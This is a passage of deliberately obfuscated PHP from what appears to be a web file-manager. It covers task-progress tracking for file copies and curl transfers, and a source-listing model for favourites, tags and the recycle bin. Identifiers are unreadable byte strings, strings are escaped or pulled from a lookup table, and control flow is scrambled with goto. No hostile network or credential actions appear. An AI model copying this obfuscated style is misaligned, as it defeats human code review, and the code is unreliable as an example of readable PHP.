$F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1607]] + $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1603]] * 0.5 + $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1604]] * 0.5; } } } } $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1558]] = $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1608]] / $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[751]]; if ($F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1558]] > 0) { $Dñ—”ÇÜ¨ï = timeFloat() - $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[777]] - $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1561]]; $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1562]] = $Dñ—”ÇÜ¨ï * (1 - $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1558]]) / $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1558]]; } } public function addPath($eÇ˘£Ùí™‘) { goto fâÑæß¡∫Ù; Aå•Ö©◊‘ö: if ($Aı’©∆≈¨Ë[$a∆‡ÓÆ‘çÆ[29]] == $a∆‡ÓÆ‘çÆ[193]) { $FÂê‘ÜäÓÔ[$a∆‡ÓÆ‘çÆ[1050]] += 1; } else { $FÂê‘ÜäÓÔ[$a∆‡ÓÆ‘çÆ[1050]] += $Aı’©∆≈¨Ë[$a∆‡ÓÆ‘çÆ[81]][$a∆‡ÓÆ‘çÆ[79]]; if ($Aı’©∆≈¨Ë[$a∆‡ÓÆ‘çÆ[397]]) { $FÂê‘ÜäÓÔ[$a∆‡ÓÆ‘çÆ[1050]] += $Aı’©∆≈¨Ë[$a∆‡ÓÆ‘çÆ[81]][$a∆‡ÓÆ‘çÆ[80]] + 1; } } $FÂê‘ÜäÓÔ[$a∆‡ÓÆ‘çÆ[751]] += $Aı’©∆≈¨Ë[$a∆‡ÓÆ‘çÆ[78]]; $this->update(); goto d÷≈˘–Ó»; eÉ≥€¿á¶á: $Aı’©∆≈¨Ë = IO::infoWithChildren($eÇ˘£Ùí™‘); $e¡«˘»›Ñ¿ = $FÂê‘ÜäÓÔ[$a∆‡ÓÆ‘çÆ[1612]] ? $FÂê‘ÜäÓÔ[$a∆‡ÓÆ‘çÆ[1612]][$a∆‡ÓÆ‘çÆ[1613]] : 0; $FÂê‘ÜäÓÔ[$a∆‡ÓÆ‘çÆ[1612]] = array($a∆‡ÓÆ‘çÆ[1613] => $e¡«˘»›Ñ¿ + 1, $a∆‡ÓÆ‘çÆ[415] => $Aı’©∆≈¨Ë[$a∆‡ÓÆ‘çÆ[28]], $a∆‡ÓÆ‘çÆ[76] => $Aı’©∆≈¨Ë[$a∆‡ÓÆ‘çÆ[76]], $a∆‡ÓÆ‘çÆ[513] => $Aı’©∆≈¨Ë[$a∆‡ÓÆ‘çÆ[513]] ? $Aı’©∆≈¨Ë[$a∆‡ÓÆ‘çÆ[513]] : $Aı’©∆≈¨Ë[$a∆‡ÓÆ‘çÆ[76]]); goto Aå•Ö©◊‘ö; fâÑæß¡∫Ù: $a∆‡ÓÆ‘çÆ =& $_SERVER[’ÿƒ†ïò]; if (!$eÇ˘£Ùí™‘) { return; } $FÂê‘ÜäÓÔ =& $this->task; goto eÉ≥€¿á¶á; d÷≈˘–Ó»: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($e›£áƒßÊ˜) { $Bäå·àÈ©ë =& $_SERVER[’ÿƒ†ïò]; $aıﬁÆ¶≠ÁØ =& $this->task; $aıﬁÆ¶≠ÁØ[$Bäå·àÈ©ë[1601]] = $e›£áƒßÊ˜[$Bäå·àÈ©ë[28]]; $aıﬁÆ¶≠ÁØ[$Bäå·àÈ©ë[1052]] = $e›£áƒßÊ˜[$Bäå·àÈ©ë[28]]; $this->update(); } public function copyFileStart($f≥Ö≠˘üúô, $eﬂÉáû¯˘Ω, $FŸ≥éåûıﬁ, $A§îÒ»ÙËá, $DâØ∆ÜéŸÆ, $Bí√Ó–—©Ù) { goto BêÃççè÷Ç; CÔÉäÏè•û: $GLOBALS[$c’ΩÆ‰á⁄¬[1615]] = $DâØ∆ÜéŸÆ; $GLOBALS[$c’ΩÆ‰á⁄¬[1614]] = $Bí√Ó–—©Ù; $Dæ€»◊ﬂî´ =& $this->task; goto dÖÙ÷¢óÙÜ; FÉ…∞≈êöƒ: $Dæ€»◊ﬂî´[$c’ΩÆ‰á⁄¬[1052]] = $c’ΩÆ‰á⁄¬[33]; $Dæ€»◊ﬂî´[$c’ΩÆ‰á⁄¬[1605]] = $c’ΩÆ‰á⁄¬[33]; $Dæ€»◊ﬂî´[$c’ΩÆ‰á⁄¬[1606]] = 0; goto Aê›ŸÏÇπÂ; dÖÙ÷¢óÙÜ: $Dæ€»◊ﬂî´[$c’ΩÆ‰á⁄¬[1601]] = $cãπŒ≈◊–Õ; $Dæ€»◊ﬂî´[$c’ΩÆ‰á⁄¬[1603]] = (int) $f≥Ö≠˘üúô->size($eﬂÉáû¯˘Ω); $Dæ€»◊ﬂî´[$c’ΩÆ‰á⁄¬[1604]] = 0; goto FÉ…∞≈êöƒ; BπÉÊ∏Ò≤å: $this->update(0, $dô∏õå±É¨); goto A§±‡∞•Î•; Aê›ŸÏÇπÂ: $dô∏õå±É¨ = $Dæ€»◊ﬂî´[$c’ΩÆ‰á⁄¬[1603]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Dæ€»◊ﬂî´[$c’ΩÆ‰á⁄¬[395]] . $c’ΩÆ‰á⁄¬[1616]); if ($dô∏õå±É¨ && file_exists(get_path_father($A§îÒ»ÙËá))) { Cache::set($Dæ€»◊ﬂî´[$c’ΩÆ‰á⁄¬[395]] . $c’ΩÆ‰á⁄¬[1616], $A§îÒ»ÙËá); $Dæ€»◊ﬂî´[$c’ΩÆ‰á⁄¬[1576]] = array($c’ΩÆ‰á⁄¬[1617], $c’ΩÆ‰á⁄¬[1618]); } goto BπÉÊ∏Ò≤å; BêÃççè÷Ç: $c’ΩÆ‰á⁄¬ =& $_SERVER[’ÿƒ†ïò]; $cãπŒ≈◊–Õ = $DâØ∆ÜéŸÆ; if ($cãπŒ≈◊–Õ == $GLOBALS[$c’ΩÆ‰á⁄¬[1614]]) { $cãπŒ≈◊–Õ = $GLOBALS[$c’ΩÆ‰á⁄¬[1615]]; } goto CÔÉäÏè•û; A§±‡∞•Î•: } public static function updateCopyLocalFileSize($C∏„±ÒÁì›) { goto e€àËè¢á—; F™–öµ©á‚: return $C∏„±ÒÁì›; goto Aﬂ–Ú∂…°π; e€àËè¢á—: $FÜÑê±∏Ù‹ =& $_SERVER[’ÿƒ†ïò]; $A‘¥Òíä ¢ = Cache::get($C∏„±ÒÁì›[$FÜÑê±∏Ù‹[395]] . $FÜÑê±∏Ù‹[1616]); if (!$A‘¥Òíä ¢ || !file_exists($A‘¥Òíä ¢)) { return $C∏„±ÒÁì›; } goto a»∞È˘®ò≠; a»∞È˘®ò≠: $C∏„±ÒÁì›[$FÜÑê±∏Ù‹[1604]] = @filesize($A‘¥Òíä ¢); $C∏„±ÒÁì›[$FÜÑê±∏Ù‹[1608]] += $C∏„±ÒÁì›[$FÜÑê±∏Ù‹[1604]]; self::updateTask($C∏„±ÒÁì›); goto F™–öµ©á‚; Aﬂ–Ú∂…°π: } public function copyFileEnd($aèµ›Ø∑Î™, $añ∂∫˜ãô, $cŸÇ∞„¬Âõ, $aáóÈ›‚®–, $B∞‘±≠º—¯, $F°ºè“´¡€) { goto a…›Í∑å√Ò; a…›Í∑å√Ò: $Bì≠ãÌ§™‹ =& $_SERVER[’ÿƒ†ïò]; $cäÍ«ˆΩ˘† =& $this->task; $cäÍ«ˆΩ˘†[$Bì≠ãÌ§™‹[1604]] = $cäÍ«ˆΩ˘†[$Bì≠ãÌ§™‹[1603]]; goto aáêªÍôÌ; aáêªÍôÌ: $cäÍ«ˆΩ˘†[$Bì≠ãÌ§™‹[1605]] = $Bì≠ãÌ§™‹[33]; unset($cäÍ«ˆΩ˘†[$Bì≠ãÌ§™‹[1576]]); if ($B∞‘±≠º—¯ == $cäÍ«ˆΩ˘†[$Bì≠ãÌ§™‹[1601]]) { $cäÍ«ˆΩ˘†[$Bì≠ãÌ§™‹[1607]] += $cäÍ«ˆΩ˘†[$Bì≠ãÌ§™‹[1603]]; $cäÍ«ˆΩ˘†[$Bì≠ãÌ§™‹[1608]] = $cäÍ«ˆΩ˘†[$Bì≠ãÌ§™‹[1607]]; $this->update(1); } else { $this->update(); $cäÍ«ˆΩ˘†[$Bì≠ãÌ§™‹[1604]] = 0; } goto fº‘ıåõªÕ; fº‘ıåõªÕ: Cache::remove($cäÍ«ˆΩ˘†[$Bì≠ãÌ§™‹[395]] . $Bì≠ãÌ§™‹[1616]); self::log($Bì≠ãÌ§™‹[1619] . $añ∂∫˜ãô . $Bì≠ãÌ§™‹[67] . $aáóÈ›‚®– . $Bì≠ãÌ§™‹[229] . $B∞‘±≠º—¯ . $Bì≠ãÌ§™‹[1620] . $cäÍ«ˆΩ˘†[$Bì≠ãÌ§™‹[1601]]); goto f¬Ô¡®πÍª; f¬Ô¡®πÍª: } public function updateFileEnd($AÚôâ¡õÎá, $a˜í‹≠–®‹) { goto DôêÜÊµ”á; D«ÚπàÓÉÚ: $D ∂¶˘µãõ[$aô⁄Âøÿ†¥[1603]] = $a˜í‹≠–®‹; $D ∂¶˘µãõ[$aô⁄Âøÿ†¥[1607]] += $a˜í‹≠–®‹; $D ∂¶˘µãõ[$aô⁄Âøÿ†¥[1608]] = $D ∂¶˘µãõ[$aô⁄Âøÿ†¥[1607]]; goto a›≤Ú’ãÙË; DôêÜÊµ”á: $aô⁄Âøÿ†¥ =& $_SERVER[’ÿƒ†ïò]; $D ∂¶˘µãõ =& $this->task; $D ∂¶˘µãõ[$aô⁄Âøÿ†¥[1601]] = $AÚôâ¡õÎá; goto D«ÚπàÓÉÚ; a›≤Ú’ãÙË: $this->update(1); self::log($aô⁄Âøÿ†¥[1621] . $AÚôâ¡õÎá); goto aÑ⁄ç≠ùÜŒ; aÑ⁄ç≠ùÜŒ: } public function sourceModelCopy($b…Ñπ≈ﬁÚ©) { goto a¢ë¢…¿ê€; dﬂ·û•‰É†: switch ($BΩﬁøª¿∏î) { case $d≥óËÕÚ◊ü[560]: $dµëÃå¨ƒÜ = 1; break; case $d≥óËÕÚ◊ü[563]: $a≥…ßƒ®⁄Ç[$d≥óËÕÚ◊ü[1601]] = $c¯Ñ∞ä≈‡â[$d≥óËÕÚ◊ü[28]]; break; case $d≥óËÕÚ◊ü[565]: $dµëÃå¨ƒÜ = intval($b…Ñπ≈ﬁÚ©[$d≥óËÕÚ◊ü[378]] * 0.4); break; case $d≥óËÕÚ◊ü[567]: $dµëÃå¨ƒÜ = intval($b…Ñπ≈ﬁÚ©[$d≥óËÕÚ◊ü[378]] * 0.2); break; case $d≥óËÕÚ◊ü[569]: $dµëÃå¨ƒÜ = intval($b…Ñπ≈ﬁÚ©[$d≥óËÕÚ◊ü[378]] * 0.4); break; } $this->update($dµëÃå¨ƒÜ); $this->sourceModelCopyFlag = !1; goto BùÖÜÊ∑âü; a¢ë¢…¿ê€: $d≥óËÕÚ◊ü =& $_SERVER[’ÿƒ†ïò]; $BΩﬁøª¿∏î = $b…Ñπ≈ﬁÚ©[0]; $c¯Ñ∞ä≈‡â = $b…Ñπ≈ﬁÚ©[1]; goto eÚ∏ÓÚÆ‡ä; eÚ∏ÓÚÆ‡ä: $a≥…ßƒ®⁄Ç =& $this->task; $this->sourceModelCopyFlag = !0; $dµëÃå¨ƒÜ = 0; goto dﬂ·û•‰É†; BùÖÜÊ∑âü: } public function sourceRemove($Eì…æé¥©≠, $féŸµÎÊéû) { $CΩåÒü†éï =& $_SERVER[’ÿƒ†ïò]; $this->sourceModelCopyFlag = !0; $fÑÜÁ©≠ïñ = 1; if (isset($Eì…æé¥©≠[$CΩåÒü†éï[81]])) { $fÑÜÁ©≠ïñ = $Eì…æé¥©≠[$CΩåÒü†éï[81]][$CΩåÒü†éï[79]] + $Eì…æé¥©≠[$CΩåÒü†éï[81]][$CΩåÒü†éï[80]] + 1; } $this->update($fÑÜÁ©≠ïñ); $this->sourceModelCopyFlag = !1; } public function sourceMove($D»¡¿ÛŸÏÏ) { $this->sourceRemove($D»¡¿ÛŸÏÏ, !1); } public function curlProgress($Dú´ÜÚáÉè, $a“õãÑ˘Â·, $a˘∫‹ë—õä, $F£ÂÆÈü⁄Ã, $dã°œ∞âßΩ) { $b˜òéƒäÙ =& $_SERVER[’ÿƒ†ïò]; $CÃ§¿Ìˆ©§ =& $this->task; if ($dã°œ∞âßΩ > 0) { $CÃ§¿Ìˆ©§[$b˜òéƒäÙ[1052]] = $b˜òéƒäÙ[1622]; $CÃ§¿Ìˆ©§[$b˜òéƒäÙ[1605]] = $b˜òéƒäÙ[107]; if ($CÃ§¿Ìˆ©§[$b˜òéƒäÙ[1603]]) { $CÃ§¿Ìˆ©§[$b˜òéƒäÙ[1604]] = $dã°œ∞âßΩ; } if ($CÃ§¿Ìˆ©§[$b˜òéƒäÙ[1606]]) { $CÃ§¿Ìˆ©§[$b˜òéƒäÙ[1604]] = $dã°œ∞âßΩ + $CÃ§¿Ìˆ©§[$b˜òéƒäÙ[1606]]; } } else { if ($a˘∫‹ë—õä > 0) { if ($CÃ§¿Ìˆ©§[$b˜òéƒäÙ[1603]] == $a“õãÑ˘Â·) { $CÃ§¿Ìˆ©§[$b˜òéƒäÙ[1604]] = $a˘∫‹ë—õä; $CÃ§¿Ìˆ©§[$b˜òéƒäÙ[1052]] = $b˜òéƒäÙ[1623]; $CÃ§¿Ìˆ©§[$b˜òéƒäÙ[1605]] = $b˜òéƒäÙ[1122]; } } } $this->update(); } public function curlProgressStart($F†⁄¶÷¯∏Ï) { } public function curlProgressEnd($A±ø≠“√™È) { goto f™µä§ÇÍø; a⁄¢≈ˆ˜ùÿ: $DÈòÙêòìÏ = $B‚’Î∏•°ı[$e›ÈÒ‘ø∂Ó[1624]]; if ($DÈòÙêòìÏ == -1) { $DÈòÙêòìÏ = $B‚’Î∏•°ı[$e›ÈÒ‘ø∂Ó[1625]]; } if ($DÜ°ÎÑÑÃè[$e›ÈÒ‘ø∂Ó[1605]] == $e›ÈÒ‘ø∂Ó[107] && $DÈòÙêòìÏ) { $DÜ°ÎÑÑÃè[$e›ÈÒ‘ø∂Ó[1606]] += $DÈòÙêòìÏ; } goto Eàç£ÏÑ≤; Eàç£ÏÑ≤: $this->update(); goto Aø¡ÉÏ≤•; f™µä§ÇÍø: $e›ÈÒ‘ø∂Ó =& $_SERVER[’ÿƒ†ïò]; $DÜ°ÎÑÑÃè =& $this->task; $B‚’Î∏•°ı = curl_getinfo($A±ø≠“√™È); goto a⁄¢≈ˆ˜ùÿ; Aø¡ÉÏ≤•: } } goto DıÖÖŒÌµ«; d≤Èáãê√†: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\162\143\x65"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\141\x6d\145" => "\x69\x6f\137\163\x6f\165\162\143\145\x5f\x6d\x65\164\141", "\155\145\164\141\x46\151\x65\154\144" => "\163\157\x75\162\143\x65\x49\x44"); protected $dataAuto = array(array("\155\157\144\x69\x66\x79\x54\151\155\145", "\x74\151\x6d\x65", "\x69\x6e\x73\x65\162\164", "\146\x75\156\143\164\x69\x6f\x6e"), array("\x63\x72\145\141\x74\145\124\151\155\x65", "\164\x69\155\x65", "\x69\156\163\x65\162\164", "\x66\165\156\x63\x74\x69\x6f\x6e"), array("\166\x69\x65\x77\124\151\155\145", "\x74\151\155\145", "\151\x6e\x73\145\162\x74", "\x66\165\156\143\x74\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($B‘„öÉ©¯°) { return $this->listSource(array($_SERVER[’ÿƒ†ïò][396] => $B‘„öÉ©¯°)); } public function typeName($fà⁄ÿ™ø»Ü) { static $bÓÂÔÀ”ˆë = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\145\x6d", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\x67\162\x6f\x75\160"); return $bÓÂÔÀ”ˆë[$fà⁄ÿ™ø»Ü . $_SERVER[’ÿƒ†ïò][33]]; } public function sourceListInfo($C∏∑êÀƒ›ﬁ, $a¨∏é’ÈÓü = false) { goto cÇ¯˘¯∆∂Í; E¶á≤Ì„”ê: return array_to_keyvalue($A∞»£ÇéÚâ, $E◊äÂ‹“»»[397]); goto DîÖ±ı“∫À; BÕéÿÁúåÖ: if (!$C∏∑êÀƒ›ﬁ) { return array(); } $A∞»£ÇéÚâ = $this->where(array($E◊äÂ‹“»»[397] => array($E◊äÂ‹“»»[7], $C∏∑êÀƒ›ﬁ)))->select(); $this->_listDataApply($A∞»£ÇéÚâ, $a¨∏é’ÈÓü); goto E¶á≤Ì„”ê; cÇ¯˘¯∆∂Í: $E◊äÂ‹“»» =& $_SERVER[’ÿƒ†ïò]; $C∏∑êÀƒ›ﬁ = $C∏∑êÀƒ›ﬁ ? $C∏∑êÀƒ›ﬁ : array(); $C∏∑êÀƒ›ﬁ = array_filter(array_unique($C∏∑êÀƒ›ﬁ)); goto BÕéÿÁúåÖ; DîÖ±ı“∫À: } public function pathInfoFilter(&$eíÖñë…èÿ) { goto A¶–ﬁ§Ü∂á; A¶–ﬁ§Ü∂á: $eÃö≤Ó‡£ =& $_SERVER[’ÿƒ†ïò]; static $eçóçú◊ôä = false; static $bßÖÀ—Ú’É = false; goto bÒÌÙÈªü ; Eâ∑Æò§âÇ: if ($eíÖñë…èÿ[$eÃö≤Ó‡£[405]] != 1) { $eíÖñë…èÿ[$eÃö≤Ó‡£[168]] = $eíÖñë…èÿ[$eÃö≤Ó‡£[407]]; unset($eíÖñë…èÿ[$eÃö≤Ó‡£[407]]); } $Fê˘‚›–‹∏ = $eçóçú◊ôä; if (isset($eíÖñë…èÿ[$eÃö≤Ó‡£[408]]) && $eíÖñë…èÿ[$eÃö≤Ó‡£[408]][$eÃö≤Ó‡£[409]] == -1) { $Fê˘‚›–‹∏ = $bßÖÀ—Ú’É; } goto CÒ¡™’ﬁ‚ﬂ; F°ÃÒÇÒ£•: $eíÖñë…èÿ[$eÃö≤Ó‡£[76]] = $eÃö≤Ó‡£[403] . $eíÖñë…èÿ[$eÃö≤Ó‡£[397]] . $eÃö≤Ó‡£[404]; $eíÖñë…èÿ[$eÃö≤Ó‡£[29]] = $eíÖñë…èÿ[$eÃö≤Ó‡£[405]] == 1 ? $eÃö≤Ó‡£[77] : $eÃö≤Ó‡£[193]; $eíÖñë…èÿ[$eÃö≤Ó‡£[406]] = $this->typeName($eíÖñë…èÿ[$eÃö≤Ó‡£[406]]); goto Eâ∑Æò§âÇ; CÒ¡™’ﬁ‚ﬂ: $eíÖñë…èÿ = array_field_key($eíÖñë…èÿ, $Fê˘‚›–‹∏); return $eíÖñë…èÿ; goto aÇÉ™€€ïæ; bÒÌÙÈªü : static $AàëÜ‘≤ï© = false; if (!$eçóçú◊ôä) { goto AùÜè⁄¯‹≤; AŒØ‹›√Ô“: $eÖ¨•Ë®® = $eÃö≤Ó‡£[401]; $cœÓ†¨œÎ“ = explode($eÃö≤Ó‡£[47], $eÖ¨•Ë®®); $eçóçú◊ôä = explode($eÃö≤Ó‡£[47], $bÑË⁄µã»»); goto a≠ÁÜìÃ¶ë; AùÜè⁄¯‹≤: $bÑË⁄µã»» = $eÃö≤Ó‡£[398]; $bÑË⁄µã»» .= $eÃö≤Ó‡£[399]; $bÑË⁄µã»» .= $eÃö≤Ó‡£[400]; goto AŒØ‹›√Ô“; a≠ÁÜìÃ¶ë: $bßÖÀ—Ú’É = array(); foreach ($eçóçú◊ôä as $f“òç”Ú¿ ) { if (in_array($f“òç”Ú¿ , $cœÓ†¨œÎ“)) { continue; } $bßÖÀ—Ú’É[] = $f“òç”Ú¿ ; } $AàëÜ‘≤ï© = explode($eÃö≤Ó‡£[47], $eÃö≤Ó‡£[402]); goto Fó«…«‚¨Ü; Fó«…«‚¨Ü: } foreach ($AàëÜ‘≤ï© as $eÃß£¶®¨) { if (isset($eíÖñë…èÿ[$eÃß£¶®¨])) { $eíÖñë…èÿ[$eÃß£¶®¨] = intval($eíÖñë…èÿ[$eÃß£¶®¨]); } } goto F°ÃÒÇÒ£•; aÇÉ™€€ïæ: } public function listUserFav() { goto Dø¥∂âª·é; Dõí‘Îî≤Æ: foreach ($fæµâÏÿáä as &$CÇËØ™Õïπ) { $CÇËØ™Õïπ = array($fóñˆ‰àÛº[414] => $CÇËØ™Õïπ[$fóñˆ‰àÛº[395]], $fóñˆ‰àÛº[415] => $CÇËØ™Õïπ[$fóñˆ‰àÛº[28]], $fóñˆ‰àÛº[416] => $CÇËØ™Õïπ[$fóñˆ‰àÛº[76]], $fóñˆ‰àÛº[417] => $CÇËØ™Õïπ[$fóñˆ‰àÛº[29]], $fóñˆ‰àÛº[418] => $CÇËØ™Õïπ[$fóñˆ‰àÛº[194]], $fóñˆ‰àÛº[419] => $CÇËØ™Õïπ[$fóñˆ‰àÛº[84]]); if ($CÇËØ™Õïπ[$fóñˆ‰àÛº[29]] == $fóñˆ‰àÛº[411] && $e∑∫Æäü‘ø[$CÇËØ™Õïπ[$fóñˆ‰àÛº[76]]]) { $CÇËØ™Õïπ[$fóñˆ‰àÛº[85]] = $e∑∫Æäü‘ø[$CÇËØ™Õïπ[$fóñˆ‰àÛº[76]]]; } } unset($CÇËØ™Õïπ); return $fæµâÏÿáä; goto EáêáÜ∆ª; a◊¶Û®Ôˆã: $f¯∂ò€ïúã = array_to_keyvalue($f¯∂ò€ïúã, $fóñˆ‰àÛº[33], $fóñˆ‰àÛº[76]); if ($f¯∂ò€ïúã) { $e∑∫Æäü‘ø = $this->listSource(array($fóñˆ‰àÛº[412] => array($fóñˆ‰àÛº[413], $f¯∂ò€ïúã))); } $e∑∫Æäü‘ø = array_to_keyvalue($e∑∫Æäü‘ø[$fóñˆ‰àÛº[367]], $fóñˆ‰àÛº[397]); goto Dõí‘Îî≤Æ; Dø¥∂âª·é: $fóñˆ‰àÛº =& $_SERVER[’ÿƒ†ïò]; $fæµâÏÿáä = Model($fóñˆ‰àÛº[410])->listData(); $f¯∂ò€ïúã = array_filter_by_field($fæµâÏÿáä, $fóñˆ‰àÛº[29], $fóñˆ‰àÛº[411]); goto a◊¶Û®Ôˆã; EáêáÜ∆ª: } public function listUserTag($eá†í®Ãœ§) { goto f∏ç™¬Ó‰Ÿ; f∏ç™¬Ó‰Ÿ: $FòÛòƒ≈Úœ =& $_SERVER[’ÿƒ†ïò]; if ($eá†í®Ãœ§ && !is_array($eá†í®Ãœ§)) { $eá†í®Ãœ§ = array($eá†í®Ãœ§); } $aû∂∫‹£ùÕ = Model($FòÛòƒ≈Úœ[420])->listData(); goto DÇâ€ŒïÙ; DÇâ€ŒïÙ: $d™°ùÙÏ“® = array(); foreach ($aû∂∫‹£ùÕ as $BƒÆÑŸê»‰) { $d£ä«Öåñ¡ = $BƒÆÑŸê»‰[$FòÛòƒ≈Úœ[76]]; if (!$d£ä«Öåñ¡) { continue; } if (!isset($d™°ùÙÏ“®[$d£ä«Öåñ¡])) { $d™°ùÙÏ“®[$d£ä«Öåñ¡] = array(); } $d™°ùÙÏ“®[$d£ä«Öåñ¡][] = $BƒÆÑŸê»‰[$FòÛòƒ≈Úœ[421]]; } $fœù¿ŸŸªÛ = array(); goto fê†”€◊™í; C”ﬁ⁄Ôÿ¢ê: if ($eïõÕ®ñÊ±) { Model($FòÛòƒ≈Úœ[422])->removeBySource($eïõÕ®ñÊ±); } return $b¶â¨¢ÃüÌ; goto b©©†ï˘»Ô; bêÕ≤ñã»±: if (!$b¶â¨¢ÃüÌ || count($fœù¿ŸŸªÛ) == $b¶â¨¢ÃüÌ[$FòÛòƒ≈Úœ[364]][$FòÛòƒ≈Úœ[365]]) { return $b¶â¨¢ÃüÌ; } $eïõÕ®ñÊ± = array(); $DÔ∫∑‚•◊ÿ = array_to_keyvalue($b¶â¨¢ÃüÌ[$FòÛòƒ≈Úœ[75]], $FòÛòƒ≈Úœ[33], $FòÛòƒ≈Úœ[397]); goto eõª§Ÿ¯è•; eõª§Ÿ¯è•: $F‰»¡ìƒÕá = array_to_keyvalue($b¶â¨¢ÃüÌ[$FòÛòƒ≈Úœ[74]], $FòÛòƒ≈Úœ[33], $FòÛòƒ≈Úœ[397]); $AÌ•ç¡∂åÚ = array_merge($F‰»¡ìƒÕá, $DÔ∫∑‚•◊ÿ); foreach ($fœù¿ŸŸªÛ as $d£ä«Öåñ¡) { if (!in_array($d£ä«Öåñ¡, $AÌ•ç¡∂åÚ)) { $eïõÕ®ñÊ±[] = $d£ä«Öåñ¡; } } goto C”ﬁ⁄Ôÿ¢ê; fê†”€◊™í: foreach ($d™°ùÙÏ“® as $DßòËÇﬁå§ => $cëãÊ§ªÙ¥) { $E©ÖÑ ùÃå = !0; if (!$eá†í®Ãœ§) { $fœù¿ŸŸªÛ[] = $DßòËÇﬁå§; continue; } foreach ($eá†í®Ãœ§ as $côâ√◊ô‰´) { if (!in_array($côâ√◊ô‰´, $cëãÊ§ªÙ¥)) { $E©ÖÑ ùÃå = !1; break; } } if ($E©ÖÑ ùÃå) { $fœù¿ŸŸªÛ[] = $DßòËÇﬁå§; } } if (!$fœù¿ŸŸªÛ) { return array(); } $b¶â¨¢ÃüÌ = $this->listSource(array($FòÛòƒ≈Úœ[412] => array($FòÛòƒ≈Úœ[413], $fœù¿ŸŸªÛ))); goto bêÕ≤ñã»±; b©©†ï˘»Ô: } public function listUserRecycle() { $F∏™µªã∫œ =& $_SERVER[’ÿƒ†ïò]; $CÜƒÇ◊Ê•Æ = Model($F∏™µªã∫œ[423])->listData(); if (!$CÜƒÇ◊Ê•Æ) { return array(); } $DÖ◊çÁË¥é = array($F∏™µªã∫œ[412] => array($F∏™µªã∫œ[413], $CÜƒÇ◊Ê•Æ), $F∏™µªã∫œ[424] => 1); return $this->listSource($DÖ◊çÁË¥é); } public function listSource($eÇÜà¶øçî, $dÀ◊áòå·ﬂ = 3000) { goto EøÛÊ∂î∂Õ; aƒ≠ú¢‰âå: $this->_listMake($AÇ∆√òŸÔè); return $AÇ∆√òŸÔè; goto E∞£ŸòäËì; aº«øßßÜè: $AÇ∆√òŸÔè = $this->field($bÙëˆ‘ù˘≤)->_makeOrder()->where($eÇÜà¶øçî)->selectPage($dÀ◊áòå·ﬂ); $this->_listPageCheck($AÇ∆√òŸÔè, $bÙëˆ‘ù˘≤, $eÇÜà¶øçî); $this->_listDataApply($AÇ∆√òŸÔè[$a˘◊§Ùœ©Á[367]]); goto aƒ≠ú¢‰âå; EøÛÊ∂î∂Õ: $a˘◊§Ùœ©Á =& $_SERVER[’ÿƒ†ïò]; if (!isset($eÇÜà¶øçî[$a˘◊§Ùœ©Á[425]])) { $eÇÜà¶øçî[$a˘◊§Ùœ©Á[425]] = 0; } $bÙëˆ‘ù˘≤ = $a˘◊§Ùœ©Á[426]; goto aº«øßßÜè; E∞£ŸòäËì: } private function _listPageCheck(&$B¶âëñ…Ô«, $EˆúÂÕ∫‡Õ, $b™Ü™ÈÿﬂÔ) { goto fÛ∆˘—Ñ…Ø; aÂŒ∫ﬁúäÖ: $EˆúÂÕ∫‡Õ = str_replace(array($c≠æ‹¥™°Ø[50], $c≠æ‹¥™°Ø[340], $c≠æ‹¥™°Ø[229]), $c≠æ‹¥™°Ø[33], $EˆúÂÕ∫‡Õ); $EˆúÂÕ∫‡Õ = $c≠æ‹¥™°Ø[430] . str_replace($c≠æ‹¥™°Ø[47], $c≠æ‹¥™°Ø[431], $EˆúÂÕ∫‡Õ) . $c≠æ‹¥™°Ø[432]; $bﬁ∑øÔÕª‡ = $c≠æ‹¥™°Ø[433]; goto B∞≤œÍôÌó; B∞≤œÍôÌó: $bﬁ∑øÔÕª‡ = $bﬁ∑øÔÕª‡ . $c≠æ‹¥™°Ø[434]; $aÖœ∑Ôî’î = $eáì∏‡ÇÚñ[$c≠æ‹¥™°Ø[361]] * ($eáì∏‡ÇÚñ[$c≠æ‹¥™°Ø[351]] - 1) . $c≠æ‹¥™°Ø[47] . $eáì∏‡ÇÚñ[$c≠æ‹¥™°Ø[361]]; $B¶ïÇÿêÈ√ = $this->_makeOrder(!0); goto A„”òî°π∞; aë≠Ê∑¨òà: foreach ($b™Ü™ÈÿﬂÔ as $F∑´◊·ÛçÇ => $e»™ë˘ÚßÕ) { $f¥·ÂãÈ“’[$c≠æ‹¥™°Ø[430] . $F∑´◊·ÛçÇ] = $e»™ë˘ÚßÕ; } $this->alias($c≠æ‹¥™°Ø[438])->field($EˆúÂÕ∫‡Õ)->limit($aÖœ∑Ôî’î)->order($FÍ€î¢∆ÙÃ); $bÕ¶Ç†Á´¥ = $this->join($bﬁ∑øÔÕª‡)->where($f¥·ÂãÈ“’)->select(); goto fêäΩè…ü; fÛ∆˘—Ñ…Ø: $c≠æ‹¥™°Ø =& $_SERVER[’ÿƒ†ïò]; if (!is_array($B¶âëñ…Ô«[$c≠æ‹¥™°Ø[364]])) { return; } $eáì∏‡ÇÚñ = $B¶âëñ…Ô«[$c≠æ‹¥™°Ø[364]]; goto A⁄Êà“„±√; A„”òî°π∞: $FÍ€î¢∆ÙÃ = $c≠æ‹¥™°Ø[430] . 